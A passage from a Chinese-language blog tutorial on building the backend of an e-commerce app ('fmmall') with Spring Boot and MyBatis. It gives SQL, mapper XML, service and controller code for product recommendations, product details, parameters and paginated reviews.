<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;LONGVARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;content&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getRecommendProduct&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Product&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select * from product order by create_time desc limit 0,3;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>ProductImgDao</p>
<pre><code class="hljs java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProductImgMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GeneralDao</span>&lt;<span class="hljs-title">ProductImg</span>&gt; </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ProductImg&gt; <span class="hljs-title">getProductImgsById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> productId)</span></span>;
&#125;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;id&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;itemId&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;url&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sort&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sort&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_main&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isMain&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;created_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createdTime&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;updated_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updatedTime&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getProductImgsById&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.ProductImg&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select * from product_img where item_id = #&#123;productId&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
</ul>
</li>
<li><p>service代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Resource</span>
<span class="hljs-keyword">private</span> ProductMapper productMapper;

<span class="hljs-meta">@Resource</span>
<span class="hljs-keyword">private</span> ProductImgMapper productImgMapper;


<span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ProductVO&gt; <span class="hljs-title">getRecommendProductList</span><span class="hljs-params">()</span> </span>&#123;
    List&lt;Product&gt; recommendProductList = productMapper.getRecommendProduct();

    List&lt;ProductVO&gt; productVOS = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
    <span class="hljs-keyword">for</span> (Product product : recommendProductList) &#123;
        ProductVO productVO = <span class="hljs-keyword">new</span> ProductVO();
        List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId()));
        BeanUtils.copyProperties(product, productVO);
        productVO.setImgs(imgs);
        productVOS.add(productVO);
    &#125;
    <span class="hljs-keyword">return</span> productVOS;
&#125;</code></pre>
</li>
<li><p>controller代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> ProductService productService;
<span class="hljs-meta">@GetMapping(&quot;/list-recommends&quot;)</span>
<span class="hljs-meta">@ApiOperation(value = &quot;获取商品推荐数据&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getRecommendsList</span><span class="hljs-params">()</span></span>&#123;
    <span class="hljs-keyword">return</span> ResultVO.success(productService.getRecommendProductList());
&#125;</code></pre>

<p>测试结果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712183632458.png" alt="image-20220712183632458"></p>
</li>
</ul>
<h3 id="1-7-分类商品推荐"><a href="#1-7-分类商品推荐" class="headerlink" title="1.7 分类商品推荐"></a>1.7 分类商品推荐</h3><blockquote>
<p>一次性加载所有分类的推荐商品，整体完成初始化</p>
<p>分别获取所有一级标题下销量最高的六个商品</p>
<p>返回查询到的6个商品</p>
</blockquote>
<ul>
<li><p>sql语句</p>
<pre><code class="hljs mysql">  
from product
where root_category_id &#x3D; rootId and product_status &#x3D; 1
order by sold_num desc
limit 0,6;</code></pre>

<p>获取到rootId下销量前六的商品信息</p>
</li>
<li><p>dao</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title">getRecommendByCategory</span><span class="hljs-params">(<span class="hljs-keyword">int</span> rootId)</span></span>;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getRecommendByCategory&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Product&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select *
    from product
    where root_category_id = #&#123;rootId&#125; and product_status = 1
    order by sold_num desc
    limit 0,6;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;CategoryDTO&gt; <span class="hljs-title">getRecommendByCategory</span><span class="hljs-params">()</span> </span>&#123;
    List&lt;Category&gt; categoryList = categoryMapper.getCategoryList(); <span class="hljs-comment">// 获取所有的分类</span>
    List&lt;CategoryDTO&gt; categoryDTOList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;(); <span class="hljs-comment">// 用于保存结果</span>
    <span class="hljs-keyword">for</span> (Category category : categoryList) &#123;
        <span class="hljs-keyword">if</span> (category.getCategoryLevel() == <span class="hljs-number">1</span>) &#123;
            CategoryDTO categoryDTO = <span class="hljs-keyword">new</span> CategoryDTO();
            List&lt;ProductVO&gt; productVOList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
            List&lt;Product&gt; productList = productMapper.getRecommendByCategory(category.getCategoryId());
            <span class="hljs-comment">// 根据root_category_id筛选属于该一级分类的商品</span>
            <span class="hljs-keyword">for</span> (Product product : productList) &#123;
                <span class="hljs-comment">//  将产品的图片查询出来加入到productVO的imgs属性中</span>
                ProductVO productVO = <span class="hljs-keyword">new</span> ProductVO();
                List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId()));
                BeanUtils.copyProperties(product, productVO);
                productVO.setImgs(imgs);
                productVOList.add(productVO);
            &#125;
            <span class="hljs-comment">// 将处理得到的productVOList加入到CategoryDTO的products属性中</span>
            categoryDTO.setProducts(productVOList);
            BeanUtils.copyProperties(category, categoryDTO);
            categoryDTOList.add(categoryDTO);
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> categoryDTOList;
&#125;</code></pre>

<p>** 该方法实现的有点复杂，并且效率比较低，可以采用联合查询的方法进行优化</p>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/category-recommends&quot;)</span>
<span class="hljs-meta">@ApiOperation(value = &quot;根据商品分类销量前六推荐商品&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getRecommendByCategoryList</span><span class="hljs-params">()</span></span>&#123;
    <span class="hljs-keyword">return</span> ResultVO.success(productService.getRecommendByCategory());
&#125;</code></pre>

<p>接口测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712235308867.png" alt="image-20220712235308867"></p>
<p>前端实现效果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712235328090.png" alt="image-20220712235328090"></p>
</li>
</ul>
<h3 id="1-8-商品详情"><a href="#1-8-商品详情" class="headerlink" title="1.8 商品详情"></a>1.8 商品详情</h3><blockquote>
<p>点击首页推荐的商品、轮播图商品广告、商品列表页面点击商品，就会进入到商品的详情页面</p>
<p>用户点击时，携带商品的id进行后端请求，后端接收到商品id后，进行数据库查询，返回详细信息</p>
<p>包括以下内容</p>
<p>1.商品的基本信息</p>
<p>2.商品的套餐信息</p>
<p>3.商品的图片信息</p>
<p>4.商品的评价信息</p>
<p>5.商品的参数信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713104403656.png" alt="image-20220713104403656"></p>
<h4 id="商品详情接口"><a href="#商品详情接口" class="headerlink" title="商品详情接口"></a>商品详情接口</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713110111555.png" alt="image-20220713110111555"></p>
<p>接口所需信息如下，只需要三个单表查询即可完成，因此dao层可以直接使用tkMapper提供的接口</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductBasicInfo</span><span class="hljs-params">(String productId)</span> </span>&#123;
    <span class="hljs-comment">//1.商品基本信息</span>
    Example example = <span class="hljs-keyword">new</span> Example(Product.class);
    Example.Criteria criteria = example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
    criteria.andEqualTo(<span class="hljs-string">&quot;productStatus&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">//状态为1表示上架商品</span>
    List&lt;Product&gt; products = productMapper.selectByExample(example);
    <span class="hljs-keyword">if</span>(products.size() &gt; <span class="hljs-number">0</span>)&#123;
        Example exampleImg = <span class="hljs-keyword">new</span> Example(ProductImg.class);
        Example.Criteria imgCriteria = exampleImg.createCriteria();
        imgCriteria.andEqualTo(<span class="hljs-string">&quot;itemId&quot;</span>,productId);
        List&lt;ProductImg&gt; productImgs = productImgMapper.selectByExample(exampleImg);

        Example exampleSku = <span class="hljs-keyword">new</span> Example(ProductSku.class);
        Example.Criteria skuCriteria = exampleSku.createCriteria();
        skuCriteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
        List&lt;ProductSku&gt; productSkus = productSkuMapper.selectByExample(exampleSku);

        HashMap&lt;String, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
        hashMap.put(<span class="hljs-string">&quot;product&quot;</span>, products.get(<span class="hljs-number">0</span>));
        hashMap.put(<span class="hljs-string">&quot;productImgs&quot;</span>, productImgs);
        hashMap.put(<span class="hljs-string">&quot;productSkus&quot;</span>, productSkus);
        <span class="hljs-keyword">return</span> ResultVO.success(hashMap);
    &#125;
    <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;查询的商品不存在&quot;</span>);
&#125;</code></pre>

<ul>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-meta">@RequestMapping(&quot;/product&quot;)</span>
<span class="hljs-meta">@Api(value = &quot;提供商品信息相关的接口&quot;,tags = &quot;商品管理&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductController</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductService productService;
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductCommontsService productCommontsService;

    <span class="hljs-meta">@ApiOperation(&quot;商品基本信息查询接口&quot;)</span>
    <span class="hljs-meta">@GetMapping(&quot;/detail-info/&#123;pid&#125;&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductBasicInfo</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span></span>&#123;
        <span class="hljs-keyword">return</span> productService.getProductBasicInfo(pid);
    &#125;

&#125;</code></pre>



</li>
</ul>
</li>
</ul>
<p>  接口测试</p>
<p>  <img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713110939926.png" alt="image-20220713110939926"></p>
<h4 id="商品参数接口"><a href="#商品参数接口" class="headerlink" title="商品参数接口"></a>商品参数接口</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713111914400.png" alt="image-20220713111914400"></p>
<p>接口所需数据可知，也为单表查询，因此dao层可以直接使用tkMapper提供的接口</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductParamsById</span><span class="hljs-params">(String productId)</span> </span>&#123;
    <span class="hljs-comment">//1.商品基本信息</span>
    Example example = <span class="hljs-keyword">new</span> Example(Product.class);
    Example.Criteria criteria = example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
    criteria.andEqualTo(<span class="hljs-string">&quot;productStatus&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">//状态为1表示上架商品</span>
    List&lt;Product&gt; products = productMapper.selectByExample(example);
    <span class="hljs-keyword">if</span>(products.size() &gt; <span class="hljs-number">0</span>)&#123;
        Example exampleParams = <span class="hljs-keyword">new</span> Example(ProductParams.class);
        Example.Criteria criteria1 = exampleParams.createCriteria();
        criteria1.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>, productId);
        List&lt;ProductParams&gt; params = productParamsMapper.selectByExample(exampleParams);
        <span class="hljs-keyword">if</span>(params.size() &gt; <span class="hljs-number">0</span>)&#123;
            <span class="hljs-keyword">return</span> ResultVO.success(params.get(<span class="hljs-number">0</span>));
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;此产品为三无产品！&quot;</span>);
        &#125;
    &#125;<span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;查询的商品不存在&quot;</span>);
    &#125;
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;商品参数信息查询接口&quot;)</span>
<span class="hljs-meta">@GetMapping(&quot;/detail-params/&#123;pid&#125;&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductParams</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span></span>&#123;
    <span class="hljs-keyword">return</span> productService.getProductParamsById(pid);
&#125;</code></pre>

<p>测试结果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713112142962.png" alt="image-20220713112142962"></p>
</li>
</ul>
<h4 id="商品评价接口"><a href="#商品评价接口" class="headerlink" title="商品评价接口"></a>商品评价接口</h4><p>评价接口需要完成两个功能：评价列表分页展示和评价分析</p>
<ul>
<li><p>评价列表分页展示</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713113518231.png" alt="image-20220713113518231" style="zoom:67%;">

<p>​    </p>
<p>接口所需参数如上图，可以看出需要关联用户数据，因此为多表关联查询</p>
<ul>
<li><p>sql</p>
<pre><code class="hljs mysql">select u.username,  u.nickname, u.user_img,
  c.comm_id, c.product_id, c.product_name,
  c.order_item_id, c.user_id, c.is_anonymous,
  c.comm_type, c.comm_level, c.comm_content,
  c.comm_imgs, c.sepc_name, c.reply_status,
  c.reply_content, c.reply_time, c.is_show
from product_comments c
INNER JOIN users u
ON u.user_id &#x3D; c.user_id
WHERE c.product_id &#x3D; 3
limit 1,5</code></pre>
</li>
<li><p>dao</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ProductCommentsVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductCommentsVO&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderItemId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_anonymous&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isAnonymous&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commType&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_level&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commLevel&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commContent&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_imgs&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commImgs&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sepc_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sepcName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyStatus&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyContent&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_show&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isShow&quot;</span> /&gt;</span>
    
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;nickname&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userImg&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
    
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectCommontsByProductId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductCommentsVOMap&quot;</span>&gt;</span>
  select u.username,  u.nickname, u.user_img,
    c.comm_id, c.product_id, c.product_name,
    c.order_item_id, c.user_id, c.is_anonymous,
    c.comm_type, c.comm_level, c.comm_content,
    c.comm_imgs, c.sepc_name, c.reply_status,
    c.reply_content, c.reply_time, c.is_show
  from product_comments c
  INNER JOIN users u
  ON u.user_id = c.user_id
  WHERE c.product_id =#&#123;productId&#125;
  limit #&#123;start&#125;,#&#123;limit&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>serevice</p>
<p>添加实体类ProductCommentsVO</p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductCommentsVO</span> </span>&#123;

    <span class="hljs-keyword">private</span> String commId;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> String productName;
    <span class="hljs-keyword">private</span> String orderItemId;
    <span class="hljs-keyword">private</span> Integer isAnonymous;
    <span class="hljs-keyword">private</span> Integer commType;
    <span class="hljs-keyword">private</span> Integer commLevel;
    <span class="hljs-keyword">private</span> String commContent;
    <span class="hljs-keyword">private</span> String commImgs;
    <span class="hljs-keyword">private</span> Date sepcName;
    <span class="hljs-keyword">private</span> Integer replyStatus;
    <span class="hljs-keyword">private</span> String replyContent;
    <span class="hljs-keyword">private</span> Date replyTime;
    <span class="hljs-keyword">private</span> Integer isShow;
    <span class="hljs-comment">//封装评论对应的用户数据</span>
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String username;
    <span class="hljs-keyword">private</span> String nickname;
    <span class="hljs-keyword">private</span> String userImg;
&#125;</code></pre>

<p>添加分页实体类</p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PageHelper</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;

    <span class="hljs-comment">//总记录数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> count;

    <span class="hljs-comment">//总页数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> pageCount;

    <span class="hljs-comment">//分页数据</span>
    <span class="hljs-keyword">private</span> List&lt;T&gt; list;

&#125;</code></pre>

<p>Service的代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listCommontsByProductId</span><span class="hljs-params">(String productId,<span class="hljs-keyword">int</span> pageNum,<span class="hljs-keyword">int</span> limit)</span> </span>&#123;
    <span class="hljs-comment">//List&lt;ProductCommentsVO&gt; productCommentsVOS = productCommentsMapper.selectCommontsByProductId(productId);</span>
    <span class="hljs-comment">//1.根据商品id查询总记录数</span>
    Example example = <span class="hljs-keyword">new</span> Example(ProductComments.class);
    Example.Criteria criteria = example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
    <span class="hljs-keyword">int</span> count = productCommentsMapper.selectCountByExample(example);
    
    <span class="hljs-comment">//2.计算总页数（必须确定每页显示多少条  pageSize = limit）</span>
    <span class="hljs-keyword">int</span> pageCount = count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;
    
    <span class="hljs-comment">//3.查询当前页的数据（因为评论中需要用户信息，因此需要连表查询---自定义）</span>
    <span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;
    List&lt;ProductCommentsVO&gt; list = productCommentsMapper.selectCommontsByProductId(productId, start, limit);
    
    <span class="hljs-keyword">return</span> ResultVO.success(list);
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;商品评价分页查询接口&quot;)</span>
<span class="hljs-meta">@GetMapping(&quot;/detail-commonts/&#123;pid&#125;&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductCommonts</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid,</span></span>
<span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@RequestParam(&quot;pageNum&quot;)</span> <span class="hljs-keyword">int</span> pageNum,</span></span>
<span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@RequestParam(&quot;limit&quot;)</span> <span class="hljs-keyword">int</span> limit)</span></span>&#123;
    <span class="hljs-keyword">return</span> productCommontsService.listCommontsByProductId(pid, pageNum, limit);
&#125;</code></pre>

<p>接口测试</p>
